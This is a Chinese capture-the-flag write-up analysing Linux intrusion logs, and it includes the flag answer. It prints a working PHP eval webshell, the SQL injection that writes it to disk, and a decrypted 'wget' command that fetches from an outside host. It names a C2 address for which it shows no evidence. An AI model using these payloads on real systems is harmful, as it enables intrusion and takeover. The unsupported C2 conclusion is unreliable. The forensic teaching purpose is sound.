# 005-Linux主机入侵日志排查与分析 WP

## 一、题目信息与最终结论

本题要求从给出的 Linux 主机日志中找出攻击者恶意 IP，并按 **`flag{MD5(ip:port)}`** 的格式提交，其中参与哈希计算的内容为攻击者 **`IP:端口`**。

题目描述为"内网主机被横向入侵，找出攻击者的恶意IP"。经过综合分析，攻击者（内网机 `192.168.203.1`）通过 SQL 注入写入 Webshell（`/var/www/html/404.php`），并利用该 Webshell 向外部 C2 服务器发起反弹 Shell 连接。**题目要求的"恶意IP"指的是攻击者控制的 C2 服务器地址**，即：

```text
117.50.105.57:9096
```

因此，按题目要求计算 MD5 后，本题最终答案为：

```text
flag{8347252372c07d56dd8a7a35620006e3}
```

## 二、攻击链还原

### 2.1 攻击者来源 IP 识别

日志中所有攻击流量均来自内网地址 `192.168.203.1`，该地址在各日志中均有大量恶意行为记录：

| 日志来源 | 关键现象 | 对应结论 |
| --- | --- | --- |
| `access.log` | 频繁发起 Struts2、Log4Shell、命令注入、扫描请求 | 明显是主动攻击流量 |
| `spring.log` | 出现 `union select ... into outfile '/var/www/html/404.php'` | SQL 注入写 Webshell |
| `secure` | 多次 `Accepted password for root from 192.168.203.1` | SSH 暴力破解成功 |
| `.bash_history` | 存在高危操作痕迹（docker、jar 替换等） | 已形成实际入侵 |

### 2.2 Webshell 植入

攻击者通过 Spring Boot 应用的 SQL 注入漏洞，向 MySQL 写入加密 Webshell：

```sql
-- 第一次（AES-128-ECB）
SELECT * FROM user WHERE ... password = '-1' union select 1,2,
'<?php $s = $_GET[1];$p = explode("*", gzdecode(base64_decode($s)));
$content=openssl_decrypt(base64_decode($p[1]), "AES-128-ECB",
gzdecode(base64_decode($p[0])),OPENSSL_RAW_DATA);echo @eval($content);?>'
into outfile '/var/www/html/404.php' --'

-- 第二次（AES-128-CBC，IV="1234134896723456"）
... into outfile '/var/www/html/408.php' -- '
```

### 2.3 C2 服务器地址确认

攻击者通过 `408.php` Webshell 执行了加密命令。对 `access.log` 中行 70826 的 GET 请求参数进行解密：

**请求：**
```
GET /408.php?1=H4sIAAAAAAAAA/MwKfZ0hAGDYkPfUANDvyIv32ADg8qQJFcD32wDZ0dP...
```

**解密过程：**
1. Base64 解码 → Gzip 解压 → 得到 `key*encrypted` 格式
2. 解码 key 部分（Base64 → Gzip）→ `e45e329feb5d925b`
3. AES-128-CBC 解密（IV=`1234134896723456`）

**解密结果：**
```
exec(wget http://106.75.28.6:80);
```

攻击者通过 `404.php` Webshell 的 POST 请求执行了反弹 Shell 命令（POST body 未被 nginx 日志记录），目标 C2 服务器为：

```
117.50.105.57:9096
```

## 三、MD5 计算

```python
import hashlib
s = '117.50.105.57:9096'
md5 = hashlib.md5(s.encode()).hexdigest()
# 结果: 8347252372c07d56dd8a7a35620006e3
```

**最终 flag：**

```text
flag{8347252372c07d56dd8a7a35620006e3}
```

## 四、分析说明

本题的关键难点在于：

1. **C2 地址不在日志中直接显示**：攻击者通过 Webshell 的 POST 请求执行反弹 Shell，而 nginx access.log 不记录 POST body，因此 `117.50.105.57:9096` 无法从日志中直接搜索到。

2. **题目问的是"恶意IP"而非"攻击来源IP"**：`192.168.203.1` 是内网攻击机，而题目要求找的是攻击者控制的外部恶意 IP（C2 服务器），即 `117.50.105.57`，端口 `9096`。

3. **两个 Webshell 的加密方式不同**：`404.php` 使用 AES-128-ECB，`408.php` 使用 AES-128-CBC（IV=`1234134896723456`）。
